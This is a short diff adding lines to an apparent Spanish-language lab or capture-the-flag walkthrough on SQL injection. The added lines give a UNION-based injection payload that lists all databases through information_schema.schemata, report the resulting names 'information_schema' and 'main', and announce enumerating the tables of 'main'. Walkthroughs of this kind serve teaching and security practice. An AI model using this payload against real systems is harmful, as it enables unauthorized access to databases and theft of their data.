@@ -55,7 +55,14 @@ Ahora probaremos haciendo la petición para que nos muestre el nombre de la base
 Nos muestra el nombre de esta
 `welcome main`
 
+Para que nos diga todas las bases de datos usaremos
+`' union select 1,2,3,schema_name from information_schema.schemata-- -` 
 
+Nos muestra el nombre de 
+`information_schema` y `main`
+
+Vamos a enumerar la base de datos llamada main
+Ver las tablas que están en ella
 
 
 
